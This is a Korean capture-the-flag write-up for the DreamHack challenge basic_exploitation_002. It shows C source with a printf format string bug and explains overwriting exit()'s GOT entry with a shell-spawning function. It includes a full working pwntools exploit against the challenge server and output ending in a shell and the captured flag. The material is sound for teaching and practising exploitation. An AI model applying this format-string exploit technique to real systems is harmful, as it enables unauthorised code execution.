# [DreamHack] basic_exploitation_002

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_002)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_exploitation_002.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548697/basic_exploitation_002.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160266469-1d263686-cebd-48ea-9bf2-ab39b1af2038.png)

## Analysis

```c
void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```

`printf(buf)`에서 FSB가 발생한다. 이를 이용하여 `exit()`의 GOT를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_002')
else:
    r = remote('host1.dreamhack.games', 12914)

get_shell = 0x8048609  # get_shell()
exit_got = 0x804a024  # GOT of exit()

get_shell_high = get_shell >> 16  # high 2bytes of get_shell()
get_shell_low = get_shell & 0xffff  # low 2bytes of get_shell()

payload = '%' + str(get_shell_low) + 'c%9$hn'
payload += '%' + str(0x10000 + get_shell_high - get_shell_low) + 'c%10$hn'
payload = payload.ljust(0x1f, 'a').encode()
payload += b'b'
payload += p32(exit_got)
payload += p32(exit_got + 2)

r.send(payload)
r.recvuntil('b')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 12914: Done
[*] Switching to interactive mode
$\xa0\x04&\xa0\x04\xff\xff\xff\xff/$ cat flag
DH{59c4a03eff1e4c10c87ff123fb93d56c}
```